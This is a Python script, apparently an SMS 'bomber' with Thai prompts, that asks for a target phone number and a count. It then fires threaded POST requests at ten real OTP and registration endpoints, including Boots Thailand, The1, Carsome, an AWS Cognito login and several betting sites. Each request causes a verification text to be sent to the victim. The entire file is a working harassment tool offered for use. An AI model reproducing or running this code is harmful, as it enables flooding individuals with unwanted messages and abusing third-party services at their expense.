import requests
import os
import time
import threading
import sys
from re import search
from threading import Thread
from requests import post,Session
os.system("clear")
phone = input("\033[95m[+] เบอร์ : \033[0m")
num = int(input("\033[95m[+] จำนวน : \033[0m"))
useragent = "Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"
def teat1():
    post("https://cognito-idp.ap-southeast-1.amaznonaws.com/",headers={"cache-control": "max-age=0","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/resetpass/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}"})
    print (f"Send number {phone} | กำลังยิง  ✓")
    
    
def teat2():
    post("https://www.carsome.co.th/website/login/sendSMS",json={"username":phone,"optType":0})
    print (f"Send number {phone} | กำลังยิง ✓")
    
def teat3():
    post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP",json={
  "on": {
    "value": phone,
    "country": "66"
  },
  "type": "mobile"
},headers={"accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 11; V2043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8"}) 



def teat4():
    post("https://ecomapi.eveandboy.com/v10/user/signup/phone", data={"phone": f"{phone[1:]}","password":"123456789Az"})
    print (f"Send number {phone} | กำลังยิง  ✓")
    
    
def teat5():
    post("https://gccircularlivingshop.com/sms/sendOtp", json={"grant_type":"otp","username": "+66"+phone,"password":"","client":"ecommerce"})
    print (f"Send number {phone} | กำลังยิง  ✓")
    
def teat6():
    post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value": phone,"country":"66"},"type":"mobile"})
    print (f"Send number {phone} | กำลังยิง  ✓")

def teat7():
    post("https://m.lucabet168.com/api/register-otp",json={"brands_id":"609caede5a67e5001164b89d","agent_register":"60a22f7d233d2900110070d7","tel": phone})
    print (f"Send number {phone} | กำลังยิง  ✓")
    
def teat8():
    post("https://store.boots.co.th/api/v1/guest/register/otp",json={"phone_number": phone})
    print (f"Send number {phone} | กำลังยิง  ✓")
    
 
    
def teat9():
    post("https://m.lavagame168.com/api/register-otp",headers={"x-exp-signature": "5ffc0caa4d603200124e4eb1","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","referer": "https://m.lavagame168.com/dashboard/login"},json={"brands_id":"5ffc0caa4d603200124e4eb1","agent_register":"5ffc0d5cdcd4f30012aec3d9","tel": phone})
    print (f"Send number {phone} | กำลังยิง  ✓")
    
def teat10():
    post("https://ep789bet.net/auth/send_otp", data={"phone":f"{phone}"})
    print (f"Send number {phone} | กำลังยิง  ✓")








for i in range(num):
	time.sleep(1)
	threading.Thread(target=teat1).start()
	threading.Thread(target=teat2).start()
	threading.Thread(target=teat3).start()
	threading.Thread(target=teat4).start()
	threading.Thread(target=teat5).start()
	threading.Thread(target=teat6).start()
	threading.Thread(target=teat7).start()
	threading.Thread(target=teat8).start()
	threading.Thread(target=teat9).start()
	threading.Thread(target=teat10).start()
